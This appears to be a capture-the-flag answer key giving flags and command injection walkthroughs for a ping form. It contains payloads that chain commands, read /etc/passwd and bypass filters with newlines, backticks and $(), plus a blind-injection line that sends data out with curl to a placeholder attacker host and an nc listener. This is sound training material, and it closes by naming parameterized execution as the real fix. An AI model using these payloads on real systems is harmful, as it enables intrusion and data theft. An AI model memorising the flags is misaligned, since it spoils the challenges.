# Command Injection Walkthroughs

## Challenge 1: Basic Command Injection (Easy — 100pts)

**Flag:** `FLAG{command_injection_101}`

### Solution
Enter in the hostname field:
```
127.0.0.1; id
```
Or:
```
127.0.0.1 && whoami
```
Or:
```
127.0.0.1 | cat /etc/passwd
```

### How it works
The backend runs: `ping -c 1 [INPUT]`
The semicolon terminates the ping command and starts a new one.

---

## Challenge 2: Blind Command Injection (Medium — 200pts)

**Flag:** `FLAG{bl1nd_cmd_inject}`

### Solution

**Step 1: Confirm injection (time-based)**
```
127.0.0.1; sleep 5
```
If the response takes 5 seconds, injection works.

**Step 2: Exfiltrate data**
```
127.0.0.1; curl http://YOUR-IP:8888/$(whoami)
```
Start a listener: `nc -lvnp 8888`

### How it works
The output is discarded (`> /dev/null 2>&1`), so you can't see results directly. Use time-based or out-of-band techniques.

---

## Challenge 3: Filtered Command Injection (Hard — 300pts)

**Flag:** `FLAG{f1lter_byp4ss_cmdi}`

### What's filtered
`;` `|` `&` `>` `<` are removed.

### Solution Options

**Option 1: Newline injection**
```
127.0.0.1%0aid
```
(`%0a` is a URL-encoded newline)

**Option 2: Backtick substitution**
```
127.0.0.1 `id`
```

**Option 3: $() substitution**
```
127.0.0.1 $(whoami)
```

### How it works
The filter removes common metacharacters but misses:
- Newlines (`\n` / `%0a`) — the shell treats them as command separators
- Backticks — command substitution
- `$()` — another form of command substitution

Real command injection prevention uses parameterized commands (exec with separate args), not filtering.
